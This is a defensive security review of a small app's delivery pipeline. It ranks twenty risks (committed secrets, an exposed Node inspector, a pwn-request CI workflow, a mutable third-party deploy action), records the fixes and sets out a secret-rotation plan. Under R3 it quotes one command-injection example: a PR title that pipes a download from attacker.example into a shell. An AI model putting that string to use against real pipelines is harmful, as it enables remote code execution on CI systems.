# StockDesk delivery chain: prioritised risks

Scope: everything in the repository (pipeline, Dockerfile, compose, Kubernetes manifests, app code),
plus the parts of the environment the repository reveals (GitHub settings, registry, cluster, test server).
Status: **Fixed** (the file change removes the risk), **Reduced** (smaller, something remains),
**Left** (not done; reason given). "Human action" means something I cannot do from the files.

## Assumptions (from the brief and the answers to the finalists' questions)

| # | Assumption | Why |
|---|---|---|
| A1 | **DB_PASSWORD, API_KEY and DEPLOY_TOKEN are live production values and are compromised.** | Nobody can prove otherwise. The file is labelled "production settings (copied from the ops wiki)", the values are named `prod` and `live`, and about 40 people (including an external contractor) have been able to read them. They are also baked into images and printed in CI logs (R5). Rotating a test value costs an hour. Missing a production value costs much more. |
| A2 | **The KUBECONFIG GitHub secret is cluster-admin on the shared cluster and may already be stolen.** | Nobody has checked its rights. It has been reachable by any PR author (R3) and by the departed contractor's action (R4). |
| A3 | **The LoadBalancer is reachable from the Internet**, until someone proves it is not. | Unchecked. A cloud LoadBalancer is public by default. |
| A4 | **The departed contractor still has access** to the org, to `corvane-labs/k8s-deploy-action`, and possibly to accounts he created (registry, cluster, DB), and he may hold copies of every secret. | Stated in the answers: his access was never removed. |
| A5 | The compose stack on the shared test server is reachable from at least the whole office network and VPN. | Its users are not documented. |
| A6 | The PostgreSQL used by the cluster is a `db` Service in namespace `default`. | `DB_HOST=db` worked from `default`. The database is not in the repository (TODO verify). |
| A7 | **My recommendation for next month:** suppliers get **read-only** access (`GET /api/products`), **one key per supplier**, through a **separate production environment** behind an Ingress with TLS and rate limiting. `POST .../adjust` stays internal. | Smallest exposure that meets the need. If suppliers also get write access with the shared key, R10 moves up to #2: the key would sit with every supplier, and today there is no way to tell who changed a stock level or to revoke one supplier. |

## How I ranked

1. **Has it already happened, or could it?** An exposure that has already happened (secrets read by 40 people) comes before one that is only possible.
2. **Who can do it, and how easily?** "Anyone who can reach a port" > "any of the 40 readers who opens a PR" > "one specific person".
3. **Blast radius.** The shared cluster and the registry come before StockDesk's own data, and its data before its availability.
4. **Dependencies.** Anything that would leak the *new* secrets again ranks high, because it has to be fixed before rotation.

## Summary

| # | Risk | Where | Severity | Status |
|---|---|---|---|---|
| R1 | Secrets committed in clear, readable by ~40 people | `.env`, `docker-compose.yml`, `k8s/secret.yaml`, `ci.yml` | Critical | Removed from the tree. **Rotation = human action** (plan below) |
| R2 | Node.js inspector (port 9229) exposed: remote code execution | `Dockerfile`, `k8s/deployment.yaml` (Deployment and LoadBalancer), `docker-compose.yml` | Critical | Fixed (dev-only override, loopback) |
| R3 | "Pwn request": PR code runs with secrets and a write token; PR-title injection | `ci.yml` | Critical | Fixed |
| R4 | Deploy action on a moving branch, owned by a repo the departed contractor can push to, given KUBECONFIG | `ci.yml` | Critical | Fixed in the file; credential rotation and access removal = human action |
| R5 | Secrets spread beyond Git: baked into images, printed by the app, echoed in CI logs | `Dockerfile` (`COPY . .`), `src/server.js`, `ci.yml` | High | Fixed for the future; existing copies = cleanup |
| R6 | Uncontrolled path to the cluster: any branch deploys, tests ignored, mutable `:latest` | `ci.yml`, `k8s/deployment.yaml` | High | Fixed (+ GitHub settings to apply) |
| R7 | Service exposure: LoadBalancer maybe public, plain HTTP, unauthenticated reads | `k8s/deployment.yaml` (Service), `src/server.js` | High (Critical when suppliers arrive) | Reduced |
| R8 | Workload not isolated on a shared cluster | `k8s/deployment.yaml` | High | Fixed (depends on the CNI and Pod Security Admission) |
| R9 | Shared test server: PostgreSQL published on all interfaces with the leaked password | `docker-compose.yml` | High | Fixed in the file; the running stack must be redeployed |
| R10 | One shared API key, no per-client identity, no audit, no rate limit | `src/server.js` | Medium now, High/Critical with suppliers | Left (design recommendation) |
| R11 | Departed contractor's access, no branch protection, fork-PR settings unknown | GitHub org settings | High | Reduced (CODEOWNERS, settings list); human action |
| R12 | Availability: liveness tied to the DB, one replica, no SIGTERM handling | `k8s/deployment.yaml`, `src/server.js` | Medium | Fixed |
| R13 | Unpinned images and tools (`latest` everywhere) | `Dockerfile`, compose, `ci.yml` | Medium | Reduced (majors pinned; digests and SHAs TODO verify) |
| R14 | No secret, config or image scanning, no SBOM, no dependency updates | `ci.yml` | Medium | Fixed in the pipeline (never run) |
| R15 | Unbounded request body: memory exhaustion | `src/server.js` | Medium | Fixed |
| R16 | Migration risk: old objects in `default` stay, including the 9229 LoadBalancer | the live cluster | Medium | Reduced (runbook in README) |
| R17 | Kubernetes Secrets are only base64; etcd encryption unknown; created by hand | the cluster | Medium | Left (recommendation) |
| R18 | Image still ships npm and a shell (Alpine) | `Dockerfile` | Low | Left |
| R19 | `/health` tells anonymous callers whether the DB is up | `src/server.js` | Low | Left |
| R20 | Pinning `postgres` can break the existing test-server volume | `docker-compose.yml` | Low (operational) | Documented (TODO verify the major) |

## Details, with the reasoning for the top five

### R1. Secrets committed in clear (Critical, removed from the tree, rotation = human action)
- **Where:** `.env` (DB_PASSWORD, API_KEY), `docker-compose.yml` (same DB password), `k8s/secret.yaml` (base64, which is encoding, not encryption), `ci.yml` (`DEPLOY_TOKEN` as a plain `env:` value). Also the ops wiki the `.env` was copied from.
- **What could happen:** anyone among the ~40 readers, or anyone holding a copy (clones, forks inside the org, the external contractor's laptop), can push images to the registry (R6 then deploys them), connect to PostgreSQL (directly on the test server, R9), and change stock levels via the API.
- **Why #1:** it is the only risk that has already happened. The others say "someone could"; here up to 40 people already have the values. It also feeds R6 and R9.
- **Done:** `.env` and `k8s/secret.yaml` deleted, no value left in any file (checked by `tools/check_consistency.py`), `.env.example` holds example values, `.gitignore` excludes `.env*`, gitleaks runs in CI. **Removing the files does not make the values safe:** they stay in Git history and in every copy. Only rotation helps (see "What to do about the exposed secrets").

### R2. Node.js inspector exposed (Critical, fixed)
- **Where:** `CMD node --inspect=0.0.0.0:9229`, `containerPort 9229`, **LoadBalancer port 9229**, and `9229:9229` on the shared test server.
- **What could happen:** the inspector protocol has no authentication. Anyone who reaches the port can run any JavaScript inside the process: read every environment variable (DB password, API key), change stock, use the mounted service-account token, and pivot into the shared cluster (R8). Chrome DevTools is enough; no skill needed.
- **Why #2:** easiest to exploit, by the most people (anyone on the office network or VPN, and the whole Internet if A3 holds), for full code execution. It ranks below R1 only because R1 has certainly already happened.
- **Done:** inspector removed from the image, the Deployment and the Service. For developers it is opt-in in `docker-compose.dev.yml`, published on `127.0.0.1` only. **Hotfix before anything else (human action):** remove port 9229 from the live Service in `default` today, without waiting for the new pipeline.

### R3. "Pwn request" in CI (Critical, fixed)
- **Where:** `pull_request_target` + `checkout ref: pull_request.head.sha` + `npm install` (runs the PR's install scripts) + `permissions: write-all` + `DEPLOY_TOKEN` in the environment + `${{ github.event.pull_request.title }}` inside `run:`.
- **What could happen:** any of the 40 readers, including the external contractor and anyone using their account, opens a PR (from an org fork) whose `package.json` or tests read the environment: they get the registry token and a write token on the repo. They can push `:latest`, which the next deploy runs. Even without code, a PR titled `"; curl attacker.example/x | sh; echo "` runs as a shell command.
- **Why #3:** as bad as R2 in impact (registry, repo, then cluster), but it needs a GitHub account with read access. Those 40 accounts are a smaller population than "network reach".
- **Done:** trigger is `pull_request` (PR code runs from the PR's own context, with `permissions: contents: read`), `persist-credentials: false`, `npm ci --ignore-scripts`, the step that put the PR title into a shell command is removed, and the two secrets move to the `test-cluster` environment, restricted to `main` and used only by the `release` job. So no job that runs PR code can read them, even if the PR edits `ci.yml`. This last part is a GitHub setting (human action).

### R4. Mutable third-party deploy action (Critical, fixed in the file)
- **Where:** `uses: corvane-labs/k8s-deploy-action@main` with `kubeconfig: ${{ secrets.KUBECONFIG }}`.
- **What could happen:** `@main` runs whatever is on that branch at run time. The departed contractor may still push to it (A4). One commit and the next deploy sends him the KUBECONFIG, which is assumed cluster-admin (A2), so the whole shared cluster (other teams' workloads too) is his. This is the same pattern as the tj-actions/changed-files compromise in March 2025.
- **Why #4:** impact as high as R3 (the whole cluster) but only **one** person is known to be able to do it. It ranks above R5 because no fix inside the repository protects the cluster while his access exists.
- **Done:** the action is gone. The pipeline calls `kubectl` directly and uses only GitHub-owned actions. `k8s/admin/ci-deployer-rbac.yaml` defines a **namespace-scoped** credential (no Secrets, no RBAC, no other namespaces) to replace KUBECONFIG. **Human action:** remove the contractor's access (R11), rotate KUBECONFIG, and check which other repos use that action.

### R5. Secrets spread beyond Git (High, fixed for the future)
- **Where:** `COPY . .` with no `.dockerignore` puts `.env`, `k8s/secret.yaml` and `.git/` (full history) into **every image layer**. `src/server.js` logs `JSON.stringify(config)` including DB_PASSWORD and API_KEY at every start. `ci.yml` runs `echo "Logging in with token $DEPLOY_TOKEN"`; GitHub only masks registered secrets, so this one was printed in clear.
- **What could happen:** anyone who can pull an image, read pod logs (`kubectl logs`, a log aggregator) or read Actions logs gets the secrets, **including the new ones after rotation**.
- **Why #5:** this is what would make the R1 rotation useless. It has to be fixed before the secrets are rotated.
- **Done:** `.dockerignore` is an allow-list (only `package*.json` and `src/`), the startup log prints `[set]`/`[missing]` (covered by a test), and the token is passed with `--password-stdin` from a masked secret, never echoed. **Cleanup (human action):** delete old images from the registry, purge old pod logs if a log store keeps them, and delete the Actions runs that printed the token.

### R6. Uncontrolled path to the cluster (High, fixed + settings)
Push on `**` deploys **any branch**. `npm test || true` never blocks. Everything is `:latest` with `imagePullPolicy: IfNotPresent`, so nobody knows which code runs, nodes may keep an old image, and a rollback is impossible.
**Done:** deploy only from `main`. Tests block. The image is tagged with the commit SHA, scanned, then deployed **by digest** (`kustomize edit set image ...@sha256`), so the cluster runs exactly the scanned bytes. The release job uses the `test-cluster` environment (one approval) and `concurrency`. **Settings to apply (human):** branch protection on `main` (PR + 1 review + "Require review from Code Owners" + status checks), and the environment restricted to `main` with required reviewers.

### R7. Service exposure (High, reduced)
LoadBalancer on plain HTTP: the API key travels in clear. `GET /api/products` needs no authentication. **Done:** debug port removed, and `loadBalancerSourceRanges` restricts the Service to office and VPN ranges (placeholders, TODO verify: until they are replaced it fails closed). **Left:** TLS, an Ingress, authentication on reads. These are prerequisites before suppliers arrive (THREAT-NOTE.md).

### R8. Workload not isolated (High, fixed)
The pod ran as root, with a writable filesystem, all default capabilities, the service-account token mounted, in `default` on a shared cluster, with no NetworkPolicy and no resource limits, so a noisy or compromised pod affects other teams. **Done:** dedicated `stockdesk` namespace with Pod Security `restricted`, non-root UID 1000 (numeric in both the Dockerfile and the pod), `readOnlyRootFilesystem` plus a 16 Mi `/tmp` emptyDir (the app's marker file), `capabilities: drop ALL`, seccomp `RuntimeDefault`, no token, requests and limits, and a NetworkPolicy (default deny; egress only DNS + PostgreSQL). **Depends on:** a CNI that enforces NetworkPolicy (TODO verify).

### R9. Shared test server (High, fixed in the file)
`5432:5432` publishes PostgreSQL on every interface of a shared server, with the leaked password. `9229` is there too (R2), plus the production `.env` and `restart: always`. **Done:** no DB port, the app on `127.0.0.1` by default (`APP_BIND` to change it deliberately), values from an untracked `.env` with `:?` guards, `read_only`, `cap_drop: ALL`, `no-new-privileges`. **Human action:** whoever runs the server redeploys with the new file and the new password, and decides who should reach it.

### R10. API authentication model (Medium now, left)
One key for everyone: no way to know who adjusted stock, no way to revoke one client, no rate limit, and a plain `!==` comparison (theoretical timing leak). Acceptable for one internal script; not acceptable for suppliers. **Recommendation:** per-client keys (hashed, with a name and a scope `read`/`adjust`), an audit log of adjustments, rate limiting at the Ingress, and `crypto.timingSafeEqual`. Not done because it changes the API contract and needs the CTO's decision (A7).

### R11. Governance outside the files (High, reduced)
The departed contractor's access was never removed (org, action repo, probably the cluster, registry and DB accounts he created). There is no branch protection. Fork-PR settings are unknown. **Done:** `.github/CODEOWNERS` for the delivery files (placeholder team, TODO verify). **Human action (GitHub org owner):** remove him everywhere, review the org audit log, make sure "Send secrets/write tokens to workflows from fork pull requests" is **off**, and require approval for fork-PR workflows.

### R12–R20 (shorter)
- **R12 Availability, fixed:** liveness used `/health`, which checks the DB with a 1 s timeout against a 1 s probe timeout and `failureThreshold: 2`, so a DB blip restarted every pod. Now liveness uses `/livez` (no DB, with a test), readiness uses `/health` (3 s timeout). There are 2 replicas, a PDB `minAvailable: 1`, `maxUnavailable: 0`, and a SIGTERM handler (Node as PID 1 has none, so each rollout waited for SIGKILL). *Caveat:* the demo keeps stock in memory per pod; set `replicas: 1` (and delete the PDB) if the real app does not use PostgreSQL yet.
- **R13 Pinning, reduced:** `node:24-alpine`, `postgres:17`, Node `24` in CI, and action major tags instead of `latest`. Digests and SHAs are **TODO verify** (I could not look them up), and the scanner image tags are explicit `TODO-verify-version` placeholders, so the pipeline fails rather than running an unchecked version. Dependabot keeps them up to date afterwards.
- **R14 Scanning, fixed (never run):** gitleaks on the tree, `trivy config` on the Dockerfile and manifests, a `trivy image` gate on fixable HIGH/CRITICAL, a CycloneDX SBOM kept 90 days, and Dependabot for actions, Docker and npm. A full-history gitleaks scan would flag the R1 values: expected, and handled by rotation.
- **R15 Body size, fixed:** `raw += c` had no limit. Now 1 KiB, `413` (with a test).
- **R16 Migration, reduced:** `kubectl apply` never deletes. The old Deployment, the **old LoadBalancer with port 9229** and the old Secret in `default` stay until someone deletes them, and the new LoadBalancer gets a new address (staff and the internal script must be told). Runbook in README.
- **R17 Secret storage, left:** Secrets are created by hand with `kubectl create secret` (README). Next step without a vault: **Sealed Secrets** (encrypted in Git, decrypted only by the in-cluster controller), and checking that etcd encryption at rest is on.
- **R18 Image surface, left:** a distroless or multi-stage image without npm/shell would be smaller. Not done because I could not build and test it, and the `HEALTHCHECK` needs `wget`.
- **R19 `/health` disclosure, left:** low value to an attacker; restrict it at the Ingress later.
- **R20 Postgres pin, documented:** PostgreSQL refuses a data directory from another major version, so pin the major that is **currently running** (`docker compose exec db postgres --version`) before redeploying. `17` is a placeholder.

---

## What to do about the exposed secrets

**Principle:** treat every value as live and stolen (A1, A2). **First close the leaks, then rotate**, otherwise the new values leak through the same paths (R3, R4, R5). Rewriting Git history comes **last** and is optional: it does not un-leak anything.
Roles: at Corvane's size these are probably 2–3 people. The **CTO** owns the decision and the communication; I can prepare the commands and check each step.

### Step 0: close the leaks (same day, before any rotation)
| # | Action | Who |
|---|---|---|
| 0.1 | Remove the departed contractor from the GitHub org and from `corvane-labs/k8s-deploy-action`; check outside collaborators, deploy keys, PATs and GitHub Apps; read the org audit log for his recent activity. | GitHub org owner |
| 0.2 | Disable the current `build-and-deploy` workflow (Actions → Disable) until this branch is merged. In settings: fork-PR workflows need approval, and secrets are never sent to fork PRs. | Repo admin |
| 0.3 | Hotfix: remove port 9229 from the live Service in `default` and stop the inspector and port 5432 on the test server. | Cluster admin; test-server owner |
| 0.4 | Merge this change (no secrets in files, no echo, no `COPY . .`, no secret in logs). Create the `test-cluster` environment and branch protection. | Repo admin + reviewer |

### Step 1: rotate, highest blast radius first
| Order | Secret | How | Check afterwards | Who |
|---|---|---|---|---|
| 1 | **KUBECONFIG** (shared cluster, assumed cluster-admin) | Apply `k8s/admin/`, build a kubeconfig for `ci-deployer` (README), store it as the `test-cluster` environment secret `KUBECONFIG`, and delete the repo-level one. Revoke the old identity: if it is a ServiceAccount token, delete the token/SA. **If it is a client certificate in `system:masters`, it cannot be revoked short of rotating the cluster CA**: plan that with the cluster admin. | The old kubeconfig gets `Unauthorized` / `Forbidden`. Look for persistence: unknown ClusterRoleBindings, DaemonSets, webhooks, pods in every namespace (audit logs if enabled). | Cluster admin |
| 2 | **DEPLOY_TOKEN** (registry push) | Revoke the token. Create a robot account that can push only to `stockdesk` and store it as the environment secret `DEPLOY_TOKEN`. | The old token fails `docker login`. In the registry audit log, look for pushes that did not come from CI. Delete the old images (they contain `.env` and `secret.yaml`, and may be tampered with); redeploy from a reviewed commit. | Registry admin |
| 3 | **DB_PASSWORD** | `ALTER ROLE stockdesk PASSWORD ...` with a new random value, **different for each environment** (test ≠ production). Update the `stockdesk-env` Secret, the test-server `.env` and wherever production runs, then restart. | The old password is refused. Look for unknown client IPs in the PostgreSQL logs. If production used it, check the stock data for unexpected changes. | DB admin + app owner |
| 4 | **API_KEY** | Generate it (for example `openssl rand -hex 32`), update the `stockdesk-env` Secret and the internal script **at the same time** (the app accepts only one key, so expect a short break for the script). Ask whether the key was ever given to anyone outside the team. | Requests with the old key get 401. Review recent adjustments for anomalies. | App owner + owner of the internal script |

Why this order: 1 and 2 give control of the **delivery chain** (cluster, then what the cluster runs). 3 gives access to the data. 4 is the narrowest (stock adjustments through the API) and needs coordination with the script's owner. All four should be done within the same day or two.

### Step 2: clean up copies
- **Ops wiki:** remove the values; replace them with "stored in the `stockdesk-env` Secret and the GitHub environment, ask X". (Owner of the wiki page.)
- Delete the Actions logs that printed `DEPLOY_TOKEN`, purge pod logs that contain the config line, and delete the old images (Step 1.2).
- **Git history (optional, last):** after rotation, `git filter-repo` to remove `.env` and `k8s/secret.yaml`, then force-push and have everyone re-clone. Clones and forks inside the org keep the old history, so this is hygiene (it stops scanners and copy-paste reuse), not remediation.
- Prevention: gitleaks in CI (done). GitHub secret scanning with push protection if the plan allows it on private repos (TODO verify).
